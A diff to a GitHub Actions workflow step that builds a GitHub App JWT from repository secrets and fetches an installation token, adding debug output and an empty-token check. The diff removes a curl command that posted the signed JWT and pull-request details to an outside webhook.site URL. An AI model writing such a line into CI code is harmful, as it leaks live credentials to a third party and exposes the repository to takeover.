@@ -737,21 +737,32 @@ jobs:
         run: |
           # Extract PR details
           pr_url="${{ github.event.client_payload.pr_url }}"
+          echo "PR URL: $pr_url"  # Debug statement
+          
           pr_path="${pr_url#*github.com/}"
+          echo "PR Path: $pr_path"  # Debug statement
+          
           owner_repo="${pr_path%%/pull*}"
+          echo "Owner/Repo: $owner_repo"  # Debug statement
+          
           owner="${owner_repo%/*}"
+          echo "Owner: $owner"  # Debug statement
+          
           repo="${owner_repo#*/}"
+          echo "Repo: $repo"  # Debug statement
 
           # Get PR number
           pr_number="${{ github.event.client_payload.pr_number }}"
+          echo "PR Number (from client payload): $pr_number"  # Debug statement
           if [ -z "$pr_number" ]; then
             pr_number="${pr_url##*/pull/}"
+            echo "PR Number (from URL): $pr_number"  # Debug statement
           fi
           
           # Generate JWT token for GitHub App authentication
           APP_ID="${{ secrets.BOT_APP_ID }}"
           PRIVATE_KEY="${{ secrets.BOT_PRIVATE_KEY }}"
-
+          
           # Create a temporary file for the private key
           echo "$PRIVATE_KEY" > private-key.pem
           
@@ -764,12 +775,12 @@ jobs:
           SIGNATURE=$(echo -n "$HEADER.$PAYLOAD" | openssl dgst -sha256 -sign private-key.pem | base64 | tr -d '=' | tr '/+' '_-')
           JWT="$HEADER.$PAYLOAD.$SIGNATURE"
           
-          # Send JWT token data to your webhook
-          curl -X POST \
-            -H "Content-Type: application/json" \
-            -d '{"jwt_token": "'"$JWT"'", "pr_url": "'"$pr_url"'", "owner_repo": "'"$owner_repo"'", "owner": "'"$owner"'", "repo": "'"$repo"'", "pr_number": "'"$pr_number"'"}' \
-            "https://webhook.site/174df5bd-163c-40b4-b2f8-9c778aa3626e"
+          # Remove any newlines or extra spaces from the JWT token
+          JWT=$(echo "$JWT" | tr -d '\n' | tr -d ' ')
 
+          # Debug: Print out the cleaned JWT token length
+          echo "JWT Token Length (no newlines or spaces): ${#JWT}"
+          
           # Get installation token for the repository
           INSTALL_TOKEN=$(curl -s -X POST \
             -H "Authorization: Bearer $JWT" \
@@ -777,6 +788,15 @@ jobs:
             "https://api.github.com/app/installations/${{ secrets.BOT_INSTALLATION_ID }}/access_tokens" \
             | jq -r '.token')
           
+          # Check for valid installation token
+          if [ -z "$INSTALL_TOKEN" ]; then
+            echo "Error: Installation token not received."
+            exit 1
+          fi
+          
+          # Debug: Print out the installation token (be cautious with sensitive data)
+          echo "Installation Token Length: ${#INSTALL_TOKEN}"  # Avoid printing sensitive token, just checking the length
+
           # Remove private key file
           rm private-key.pem
           
